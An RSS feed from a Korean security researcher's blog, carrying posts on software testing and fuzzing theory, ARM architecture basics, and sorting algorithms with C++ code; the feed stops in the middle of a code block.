<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>rvkhunLab</title>
    <link>https://pwnkidhn.github.io/</link>
    
    <atom:link href="https://pwnkidhn.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>Security Researcher / CTF Player</description>
    <pubDate>Fri, 01 Apr 2022 04:17:03 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>소프트웨 테스팅과 퍼징</title>
      <link>https://pwnkidhn.github.io/2022/03/30/2022-03-31-swtesting/</link>
      <guid>https://pwnkidhn.github.io/2022/03/30/2022-03-31-swtesting/</guid>
      <pubDate>Wed, 30 Mar 2022 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;소프트웨어-테스트&quot;&gt;&lt;a href=&quot;#소프트웨어-테스트&quot; class=&quot;headerlink&quot; title=&quot;소프트웨어 테스트&quot;&gt;&lt;/a&gt;소프트웨어 테스트&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;소프트웨어의 결함을 최대한 찾아내 줄이고, 소프트웨어의 품질을 높</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="소프트웨어-테스트"><a href="#소프트웨어-테스트" class="headerlink" title="소프트웨어 테스트"></a>소프트웨어 테스트</h1><ul><li>소프트웨어의 결함을 최대한 찾아내 줄이고, 소프트웨어의 품질을 높인다.</li></ul><h2 id="테스트의-필요성과-특징"><a href="#테스트의-필요성과-특징" class="headerlink" title="테스트의 필요성과 특징"></a>테스트의 필요성과 특징</h2><h3 id="소트프웨어-테스트의-정의"><a href="#소트프웨어-테스트의-정의" class="headerlink" title="소트프웨어 테스트의 정의"></a>소트프웨어 테스트의 정의</h3><ul><li>IEEE : 테스트는 시스템이 명시된 요구를 잘 만족하는지, 즉 예상된 결과와 실제 결과가 어떤 차이를 보이는지 수동이나 자동으로 검사하고 이를 평가하는 작업을 의미한다.</li><li>조하 만나 : 테스트는 시스템의 명세까지 완벽하게 옳다고 확신할 수 없고, 테스트 시스템 그 자체가 맞다고 증명할 수 없기 때문에 프로그램을 완전히 테스트할 수 없다.</li><li>달, 다익스트라, 호어 : 테스트는 결함이 있음을 보여줄 뿐, 결함이 없음을 증명할 수는 없다.</li></ul><p>결국 소프트웨어 테스트는 **’소프트웨어 내에 존재하지만 드러나지 않고 숨어 있는 오류를 발견할 목적으로 개발 과정에서 생성되는 문서나 프로그램에 있는 오류를 여러 기술을 이용해 검출하는 작업’**이다.</p><ul><li>작은 의미 : 원시 코드 속에 남아 있는 오류를 발견하는 것</li><li>큰 의미 : 개발된 소프트웨어가 고객의 요구를 만족하는지 확인해주는 것</li></ul><h3 id="테스트의-어려움"><a href="#테스트의-어려움" class="headerlink" title="테스트의 어려움"></a>테스트의 어려움</h3><ul><li>테스트 케이스가 적어 효과에 한계가 있다. </li><li>완벽한 테스트 케이스를 도출하기 어렵다.</li><li>테스트를 위한 실제 사용 환경을 구축하기 어렵다.</li><li>완벽한 테스트는 불가능하다. (오류가 없음을 보장할 수 없다.)</li><li>테스트 내성 문제 해결을 위해 테스트 케이스 업데이트가 필요하다.</li></ul><h3 id="테스트-케이스"><a href="#테스트-케이스" class="headerlink" title="테스트 케이스"></a>테스트 케이스</h3><ul><li><p>테스트 케이스란 명세 기반 테스트의 설계 산출물로 설계된 입력값, 실행조건, 기대 결과로 구성되어 있는 테스트 항목의 명세서를 의미한다.</p></li><li><p>테스트 누락 방지와 테스트 투명화를 위해 사용한다.</p></li><li><p>오류 : 소프트웨어 개발자에 의해 생기는 실수로 결함의 원인이 됨.</p></li><li><p>결함 : 오류에 의해 프로그램이 완전하지 못한 것으로, 고장의 원인이 됨.</p><ul><li>프로그램이 실행 중에 멈추거나, 예외 처리 모듈이 작동할 수 있다. 시스템이 작동 불능상태에 빠질 수 있다.</li></ul></li><li><p>고장 : 시스템이 요구사항대로 작동하지 않는 것을 말한다. </p><ul><li>모든 결함은 반드시 실패를 유발하지는 않는다.</li></ul></li></ul><h2 id="테스트의-분류"><a href="#테스트의-분류" class="headerlink" title="테스트의 분류"></a>테스트의 분류</h2><h3 id="확인-테스트"><a href="#확인-테스트" class="headerlink" title="확인 테스트"></a>확인 테스트</h3><ul><li>개발자가 개발한 프로그램이 제대로 돌아가는지 확인하는 테스트.</li><li>사용자가 1<del>10까지 곱하는 프로그램을 주문했는데, 개발자가 1</del>10까지 더하는 프로그램을 만들었다.</li><li> 확인 테스트를 수행한다면, 1~10까지 더하는 과정이 정확하고, 결과가 맞는지만 테스트 한다. </li><li> 하지만 실제 사용자가 원하는 것은 덧셈이 아닌 곱셈으로, 확인 테스트만으로는 사용자가 원하는 것을 개발했는지 알 수 없다.</li></ul><h3 id="검증-테스트"><a href="#검증-테스트" class="headerlink" title="검증 테스트"></a>검증 테스트</h3><ul><li>사용자의 요구사항대로 만들었는지를 테스트.</li><li>검증 테스트를 통해 소프트웨어가 사용자의 목적에 맞게 구현되었는지를 알 수 있다.</li></ul><hr><h3 id="성능-테스트"><a href="#성능-테스트" class="headerlink" title="성능 테스트"></a>성능 테스트</h3><ul><li>소프트웨어의 효율성을 진단하는 테스트.</li><li>사용자의 요구사항 중에서 성능과 관련된 요구사항을 시스템이 얼마나 준수하는지 테스트.</li></ul><h3 id="스트레스-테스트"><a href="#스트레스-테스트" class="headerlink" title="스트레스 테스트"></a>스트레스 테스트</h3><ul><li>평소보다 많은 비정상적인 값, 양, 빈도, 부피 등으로 부하를 발생시켜 부하가 최고치인 상황에서시스템의 반응을 살피고 이때 발생하는 오류를 찾는 것이다.</li></ul><h3 id="보안-테스트"><a href="#보안-테스트" class="headerlink" title="보안 테스트"></a>보안 테스트</h3><ul><li>보안 시스템이 불법적인 침투를 잘 막아내는지 테스트 한다.</li></ul><h3 id="안정성-테스트"><a href="#안정성-테스트" class="headerlink" title="안정성 테스트"></a>안정성 테스트</h3><ul><li>소프트웨어는 한 번 설치되면 오랫동안 운영된다.</li><li>일주일 동안 시스템에 부하를 주어 관찰한다.</li><li>자원을 사용한 후에 정상적으로 반납하는지 관찰. </li></ul><h3 id="복원-가능성-테스트"><a href="#복원-가능성-테스트" class="headerlink" title="복원 가능성 테스트"></a>복원 가능성 테스트</h3><ul><li>소프트웨어에 문제가 생겼을 경우, 이를 복원 가능한지 테스트.</li></ul><hr><h3 id="black-box-테스트"><a href="#black-box-테스트" class="headerlink" title="black-box 테스트"></a>black-box 테스트</h3><ul><li>프로그램 내부의 구조나 알고리즘을 보지 않고, 요구분석명세서나 설계서에서 테스트 케이스를 추출해 테스트한다.</li><li>어떻게 수행하는가보다는 사용자가 원하는 기능을 수행하는가에 대해 테스트 한다.</li><li>신택스 기법 : 문법에 기반을 둔 테스트, 문법을 정해놓고 적합/부적합 입력에 따라 결과를 확인.</li><li>경계 값 분석 기법 : 경계 값을 테스트 데이터로 쓴다. 경계 값, 경계 이전 값, 경계 이후 값 결과 확인.</li></ul><h3 id="white-box-테스트"><a href="#white-box-테스트" class="headerlink" title="white-box 테스트"></a>white-box 테스트</h3><ul><li>프로그램 내부에서 사용되는 변수나 서브루틴 등의 오류를 찾기 위해 프로그램 코드의 내부 구조를 테스트.</li><li>어떻게 수행하는 지를 테스트.</li><li>statement, branch, condition, path를 실행 테스트.</li></ul><hr><h2 id="퍼즈-테스팅"><a href="#퍼즈-테스팅" class="headerlink" title="퍼즈 테스팅"></a>퍼즈 테스팅</h2><h3 id="퍼징"><a href="#퍼징" class="headerlink" title="퍼징"></a>퍼징</h3><ul><li>퍼즈 테스팅(Fuzz testing)은 fuzzing을 이용하는 소프트웨어 테스팅 기술의 한 형태라고 볼 수 있다. </li><li>다른 테스팅 분야와 차별화되는 가장 큰 목적성은 프로그램의 충돌(Crash) 현상을 비롯한 ‘보안 관련 버그’를 찾는 것이다.</li><li>간단한 퍼징을 통해 오류 처리 루틴의 테스트에 사용되기도 한다.</li></ul><h3 id="퍼징을-하는-이유"><a href="#퍼징을-하는-이유" class="headerlink" title="퍼징을 하는 이유"></a>퍼징을 하는 이유</h3><ul><li>어떤 제품에 대하여 테스트 케이스가 정의되어 있다면, 이는 ‘어떻게 작동하도록 설계되어있는지’, ‘어떻게 하면 안되는지’ 에 대한 명세가 정해져있다는 뜻이다. </li><li>이러한 기준이 있다하더라도, 프로그래머 또는 테스터는 사람이므로, 생각해보지 못한 초월 영역이 존재할 수 있다.</li><li>이러한 빈틈을 매우는 것이 퍼징이며, 그러한 정의되지 않은 영역을 테스트하는 일종의 탐험가 역할을 한다.</li></ul><p><strong>퍼징의 주요 목적은 제품/프로그램의 올바른 기능을 테스트하는 것이 아니라, 정의되지 않은 영역을 검증하고 확인하는 작업이다.</strong></p><p><img src="https://user-images.githubusercontent.com/49066484/161178684-f80779ae-e1ce-4ef6-ad55-86715c24f66f.png" alt="image"></p><h3 id="Black-box-퍼징"><a href="#Black-box-퍼징" class="headerlink" title="Black-box 퍼징"></a>Black-box 퍼징</h3><ul><li>PUT의 내부를 들여다 보지 않고, input과 output만을 관찰한다.</li><li>valid한 input을 mutate하는 방식으로 사용.</li><li>커버리지를 측정하지 못해 Corpus가 자라나지 않음.</li><li>커스텀 펌웨어의 추출과 에뮬레이션이 어려운 IoT에 대부분 블랙박스 방식을 사용.</li><li>혹은 target이 큰 커서 분석하기 어려운 경우, 같은 input에 대해 non deterministic한 경우에 사용.</li></ul><h3 id="White-box-퍼징"><a href="#White-box-퍼징" class="headerlink" title="White-box 퍼징"></a>White-box 퍼징</h3><ul><li>PUT의 내부구조와 실행 중에 발생하는 정보들을 기반으로 하여 테스트 케이스를 생성한다.</li><li>블랙 박스보다 오버헤드가 크다.</li><li>커버리지를 측정할 수 있다.</li><li>Corpus는 퍼징에 사용되는 샘플 셋이며, 코드 커버리지가 최대한 겹치지 않는 최소한의 샘플 셋을 만들어 퍼징 효율을 높일 수 있다. </li><li>같은 input에 대해 deterministic한 경우에 사용.</li></ul><h3 id="사용-관점"><a href="#사용-관점" class="headerlink" title="사용 관점"></a>사용 관점</h3><p>개발자는 프로그램 내 잠재된 보안 관련 버그를 찾아 패치하여 SW 품질을 높인다.<br>공격자는 프로그램 내 잠재된 보안 관련 버그를 찾아 공격에 사용한다.</p><p><img src="https://user-images.githubusercontent.com/49066484/161176769-e6dcc9f9-6ce4-4ade-8dfa-dedabcc950c6.png" alt="img"></p><h2 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h2><ul><li>퍼즈 테스팅은 소프트웨어 테스팅 기법 중 하나로, 보안 관련 버그를 찾기 위해 사용된다.</li><li>테스트 기준을 만들고, 이 기준을 목표로 테스팅을 했지만, 무수히 많은 가능성이 존재하기에 오류는 남아 있을 것이며, 이를 위한 자동화된 동적 테스팅 기법이 퍼즈 테스팅이다.</li><li>버퍼 오버 플로우, 메모리 릭 과 같은 취약점을 미리 방지해 기밀성과 무결성을 유지할 수 있다.</li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Fuzzing/">Fuzzing</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://pwnkidhn.github.io/tags/theory/">theory</category>
      
      
      <comments>https://pwnkidhn.github.io/2022/03/30/2022-03-31-swtesting/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Embedded Recipes_2_ARM을 파헤쳐 보자</title>
      <link>https://pwnkidhn.github.io/2022/03/27/2022-03-28-2_ARM/</link>
      <guid>https://pwnkidhn.github.io/2022/03/27/2022-03-28-2_ARM/</guid>
      <pubDate>Sun, 27 Mar 2022 15:00:00 GMT</pubDate>
      
      <description>&lt;ul&gt;
&lt;li&gt;ARM (Advanced RISC machine)&lt;/li&gt;
&lt;li&gt;CISC(complex instruction set computer)&lt;br&gt;  Micro programming 방식 : 기계어 하나를 실행하기 위해 많은 양의 작은 micro instruction들이 숨어서 실행&lt;/li&gt;
&lt;li&gt;RISC(Reduced Instruction set computer)&lt;br&gt;  Hard wired 방식 : 기계어 한줄을 실행하기 위하여, 그에 해당하는 노리회로를 구성하여 구현하는 방식. &lt;/li&gt;
&lt;/ul&gt;</description>
      
      
      
      <content:encoded><![CDATA[<ul><li>ARM (Advanced RISC machine)</li><li>CISC(complex instruction set computer)<br>  Micro programming 방식 : 기계어 하나를 실행하기 위해 많은 양의 작은 micro instruction들이 숨어서 실행</li><li>RISC(Reduced Instruction set computer)<br>  Hard wired 방식 : 기계어 한줄을 실행하기 위하여, 그에 해당하는 노리회로를 구성하여 구현하는 방식. </li></ul><span id="more"></span><h2 id="CISC-vs-RISC"><a href="#CISC-vs-RISC" class="headerlink" title="CISC vs RISC"></a>CISC vs RISC</h2><h3 id="CISC-Complex-Instruction-Set-Computer"><a href="#CISC-Complex-Instruction-Set-Computer" class="headerlink" title="CISC (Complex Instruction Set Computer)"></a>CISC (Complex Instruction Set Computer)</h3><p>하나의 명령어당 최대한 많은 작업을 수행</p><p><img src="https://user-images.githubusercontent.com/49066484/160324775-67400041-6489-41b8-95d0-a8c950ce020e.png" alt="image"></p><ul><li>명령어의 길이가 가변적</li><li>복잡한 기능이 많은 명령어로 구성된 프로세서</li><li>복합 명령을 가짐으로써 하위 호환성을 충분히 확보</li><li>전력소모가 큼, 속도가 느리고 가격이 비쌈</li><li>호환성이 절대적으로 필요한 PC 환경에서 사용</li></ul><h3 id="RISC-Reduced-Instruction-Set-Computer"><a href="#RISC-Reduced-Instruction-Set-Computer" class="headerlink" title="RISC (Reduced Instruction Set Computer)"></a>RISC (Reduced Instruction Set Computer)</h3><p>명령어 하나당 하나의 연산만을 수행</p><p><img src="https://user-images.githubusercontent.com/49066484/160324936-54e18292-7cb6-47da-98f2-239e325252d4.png" alt="image"></p><ul><li>명령어의 길이가 고정적</li><li>하드웨어가 간단한 대신, 소프트웨어가 복잡함.</li><li>전력소모가 적음, 속도가 빠르고 가격이 저렴</li><li>하위 호환을 위해 에뮬레이션 방식을 채택, 호환성 부족</li></ul><h2 id="ARM-mode-and-Thumb-mode"><a href="#ARM-mode-and-Thumb-mode" class="headerlink" title="ARM mode and Thumb mode"></a>ARM mode and Thumb mode</h2><h3 id="Thumb-mode"><a href="#Thumb-mode" class="headerlink" title="Thumb mode"></a>Thumb mode</h3><ul><li>Thumb mode는 ARM mode의 반쪽으로 볼 수 있다.</li><li>처음 32 bit ARM가 나왔을 때, 임베디드 시스템 메모리는 16비트 data line을 가진 메모리가 주 였다. 따라서 32 bit 코어라해도, 메모리를 효율적으로 사용하기 위해서는 16비트 처리가 필요하다.</li></ul><h3 id="ARM의-동작-mode"><a href="#ARM의-동작-mode" class="headerlink" title="ARM의 동작 mode"></a>ARM의 동작 mode</h3><p>User (USR) : Normal Program execution mode<br>System (SYS) : Run privileged operating system tasks<br>Fast Interrupt Request (FIQ) : When a high priority (fast) interrupt is raised<br>Interrupt Request (IRQ) : When a low priority (normal) interrupt is raised<br>Supervisor (SVC) : A protected mode for the operatng system, entered when a SWI instruction is exectued<br>Abort (ABT) : Used to handle memory access violations<br>Undef (UND) : Used to handle undefined instructions</p><ul><li>USR은 Application program을 실행하는 모드.</li><li>SYS는 USR와 비슷하지만, 특권을 가지고 있다는 차이가 있음.</li><li>SVC는 SWI 명령이 발생하면 전환된다. 대부분의 시스템 자원을 자유롭게 관리할 수 있는 모드.</li></ul><h3 id="Privileged-Mode-vs-Normal-mode"><a href="#Privileged-Mode-vs-Normal-mode" class="headerlink" title="Privileged Mode vs Normal mode"></a>Privileged Mode vs Normal mode</h3><ul><li>USR을 제외한 모든 모드는 특권 모드이다.</li></ul><ol><li>특권 모드는 IRQ, FIQ등의 인터럽트의 사용 가능 유무를 직접 설정 할 수 있다.</li><li>특권 모드는 서로 모드 변경이 자유롭게 가능하지만, 일반 모드에서 특권 모드의 변경은 불가능 하다.</li><li>ARM의 기본적인 mode는 SVC모드이다. 부팅시 ARM에 대한 모든 권한을 행사하기 위함.</li></ol><h2 id="ARM-Register"><a href="#ARM-Register" class="headerlink" title="ARM Register"></a>ARM Register</h2><p><img src="https://user-images.githubusercontent.com/49066484/160336597-f44c982e-f2db-41a6-9bcc-af9d64d34fd5.png" alt="image"></p><ul><li>ARM core는 모드가 바뀌면서 사용하는 레지스터 셋도 바뀐다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/160337033-88e2b1cc-7060-4502-acf5-065a53712ed9.png" alt="image"></p><ul><li>모든 모드가 공유하는 레지스터는 CPSR, PC, R0~R7</li></ul><h3 id="특별한-용도의-레지스터"><a href="#특별한-용도의-레지스터" class="headerlink" title="특별한 용도의 레지스터"></a>특별한 용도의 레지스터</h3><p>CPSR : Current Program Status Register</p><p><img src="https://user-images.githubusercontent.com/49066484/160337383-9a0e4bbe-b1a9-448a-b1a2-f00a79a32577.png" alt="image"></p><ul><li>NZCV : 연산 후 결과 값에 따라 set 됨.</li><li>IF : IRQ나 FIQ가 걸릴 수 있는지에 관한 필드, 인터럽트에 대한 컨트롤이 가능하다.</li><li>T : Thunmb 모드 set</li><li>mode : 현재 mode를 나타냄. </li></ul><p>SPSR : Saved Program Status Register</p><ul><li>CPSR를 복사해 넣는 특수 레지스터.</li><li>CPSR를 백업하기 위함.</li><li>모드 변경 시 사용.</li></ul><p>R14 : Linked Register (RBP)</p><ul><li>리턴 주소를 담고 있다.</li></ul><p>R13 : Stack Pointer (RSP)</p><ul><li>현재 스택의 꼭대가를 가리킴</li></ul><p>R15 : Program Counter (RIP)</p><ul><li>다음 실행할 명령어를 가리킴.</li><li>현재 Fetch 해 온 위치를 가리킴. (현재 까지 실행된거 X)</li></ul><h3 id="Context-Switching"><a href="#Context-Switching" class="headerlink" title="Context Switching"></a>Context Switching</h3><ul><li>문맥 전환,</li><li>프로세스 실행 중, 인터럽트로 인해 다른 프로세스가 실행될 때</li><li>레지스터 값을 교체하는 작업</li></ul><h2 id="ARM-Exception"><a href="#ARM-Exception" class="headerlink" title="ARM Exception"></a>ARM Exception</h2><ul><li><p>Exception은 Interrupt를 포함한 더 큰 사건,</p></li><li><p>외부 요청, 오류에 관련된 사건.</p></li><li><p>Interrupt : 제어 흐름에서 예상치 못한 외부에서 전달되는 사건.</p></li><li><p>Exception : 프로세서 내부에서 발생하는 예상치 못한 사건.</p></li></ul><h3 id="내부-인터럽트-exception"><a href="#내부-인터럽트-exception" class="headerlink" title="내부 인터럽트 (exception)"></a>내부 인터럽트 (exception)</h3><ul><li>SVC 인터럽트 : 외부의 프로그램이 의도적으로 호출.</li><li>산술 오버플로우/언더플로우</li><li>0 으로 나누기</li><li>정의 안된 명령어 수행</li></ul><h3 id="외부-인터럽트-interrupt"><a href="#외부-인터럽트-interrupt" class="headerlink" title="외부 인터럽트 (interrupt)"></a>외부 인터럽트 (interrupt)</h3><ul><li>I/O 인터럽트 : 입출력 요구가 있을 때 하드웨어가 발생</li><li>전원 이상 인터럽트</li><li>기계 착오 인터럽트 : CPU 등의 기능적 오류</li><li>외부 신호 인터럽트 : Timer등으로 발생.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/160342208-5cbb9bc9-c6a1-49ca-872f-dac08e406cae.png" alt="image"></p><ul><li>Exception이 발생하면, 그 Exception에 해당하는 미리 정해진 주소의 프로그램을 하드웨어적으로 수행함.</li><li>이 주소를 Exception Vector라 한다.</li></ul><ol><li>SVC mode : SVC 모드는 power on이나 reset이 일어난 경우에 진입한다.</li><li>IRQ mode : 하드웨어적인 인터럽트가 발생하면 진입한다.</li><li>FIQ mode : 인터럽트 중에 Fast 인터럽트가 발생하면 진입한다.</li><li>ABT mode : Access하는 주소가 Access 할 수 없는 경우, 명령어를 Fetch를 못할 경우. 에 진입한다.</li><li>UND mode : 명령어를 해석했는데 ARM이 모르는 명령어일 경우 진입한다. 보통 메모리 커럽션이 나면 발생, &gt; 이를 응용하면 일부러 코드를 삽입하여 UND vector 주소로 jmp하도록 할 수 있음.</li></ol><p><img src="https://user-images.githubusercontent.com/49066484/160343869-ed3b43b5-dc44-4b89-83bb-34b4399ccc6b.png" alt="image"></p><h3 id="Exception-우선-순위"><a href="#Exception-우선-순위" class="headerlink" title="Exception 우선 순위"></a>Exception 우선 순위</h3><ol><li>Reset</li><li>Data Abort</li><li>FIQ</li><li>IRQ</li><li>Prefetch Abort</li><li>Undefined Instruction</li><li>SWI</li></ol><h3 id="Exception-처리-과정"><a href="#Exception-처리-과정" class="headerlink" title="Exception 처리 과정"></a>Exception 처리 과정</h3><ul><li>Exception이 발생 한 후, 이전 모드로 돌아갈 수 있어야 한다.</li><li>Register 값을 다시 사용할 수 있어야 한다. 이전에 쓰던 Context를 다시 복원할 수 있어야 한다.</li><li>이전 모드로 돌아갔을 때 원래 수행하던 곳으로 돌아갈 수 있어야 한다.</li></ul><p><img src="https://user-images.githubusercontent.com/49066484/160345077-565063a5-7282-4e91-9bfa-fea17214e86f.png" alt="image"></p><h2 id="ARM-Procedure-Call-Standard-함수-호출-규약"><a href="#ARM-Procedure-Call-Standard-함수-호출-규약" class="headerlink" title="ARM Procedure Call Standard (함수 호출 규약)"></a>ARM Procedure Call Standard (함수 호출 규약)</h2><ol><li>함수를 부를 때 레지스터는 어떻게 사용 하는가.</li><li>return 값은 어떻게 돌려 주는가.</li><li>스택은 어떨 때, 어떻게 사용되는가.</li><li>일반적인 레지스터들은 어떻게 사용되는가.</li></ol><p><img src="https://user-images.githubusercontent.com/49066484/160349107-4605d2bc-8d8f-46be-95e8-138aab69444b.png" alt="image"></p><p><img src="https://user-images.githubusercontent.com/49066484/160350245-766e5338-3542-4ec1-8278-18ba4e8715ce.png" alt="image"></p><ul><li>R4 ~ R11을 사용하려면, 스택에 저장 후 사용하고, return시 이전 값을 레지스터에 복원해야 한다.</li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/EmbeddedSystem/">EmbeddedSystem</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/Embedded/">Embedded</category>
      
      <category domain="https://pwnkidhn.github.io/tags/ARM/">ARM</category>
      
      
      <comments>https://pwnkidhn.github.io/2022/03/27/2022-03-28-2_ARM/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Sorting </title>
      <link>https://pwnkidhn.github.io/2022/03/24/2022-03-25-Sorting/</link>
      <guid>https://pwnkidhn.github.io/2022/03/24/2022-03-25-Sorting/</guid>
      <pubDate>Thu, 24 Mar 2022 15:00:00 GMT</pubDate>
      
      <description>&lt;ul&gt;
&lt;li&gt;정렬 비교&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Bubble-Sort&quot;&gt;&lt;a href=&quot;#Bubble-Sort&quot; class=&quot;headerlink&quot; title=&quot;Bubble Sort&quot;&gt;&lt;/a&gt;Bubble Sort&lt;/h2&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;bubble_sort&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&amp;gt; &amp;amp;vec)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i&amp;lt;vec.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;()&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; j=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; j&amp;lt;vec.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;()-i; j++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(vec[j&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;] &amp;gt; vec[j])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; tmp = vec[j&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                vec[j&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;] = vec[j];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                vec[j] = tmp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/49066484/159401499-9075c8bf-a1d9-4024-9611-53fd8fc05376.gif&quot; alt=&quot;bubble-sort-001&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;시간 복잡도 : n(n-1)/2 =&amp;gt; O(N^2)&lt;/li&gt;
&lt;li&gt;공간 복잡도 : O(N)&lt;/li&gt;
&lt;li&gt;Stable sort.</description>
      
      
      
      <content:encoded><![CDATA[<ul><li>정렬 비교</li></ul><h2 id="Bubble-Sort"><a href="#Bubble-Sort" class="headerlink" title="Bubble Sort"></a>Bubble Sort</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bubble_sort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt; &amp;vec)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;vec.<span class="built_in">size</span>()<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;vec.<span class="built_in">size</span>()-i; j++)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(vec[j<span class="number">-1</span>] &gt; vec[j])&#123;</span><br><span class="line">                <span class="keyword">int</span> tmp = vec[j<span class="number">-1</span>];</span><br><span class="line">                vec[j<span class="number">-1</span>] = vec[j];</span><br><span class="line">                vec[j] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/49066484/159401499-9075c8bf-a1d9-4024-9611-53fd8fc05376.gif" alt="bubble-sort-001"></p><ul><li>시간 복잡도 : n(n-1)/2 =&gt; O(N^2)</li><li>공간 복잡도 : O(N)</li><li>Stable sort.<span id="more"></span></li></ul><h2 id="Selection-Sort"><a href="#Selection-Sort" class="headerlink" title="Selection Sort"></a>Selection Sort</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">selection_sort</span><span class="params">(vector&lt;<span 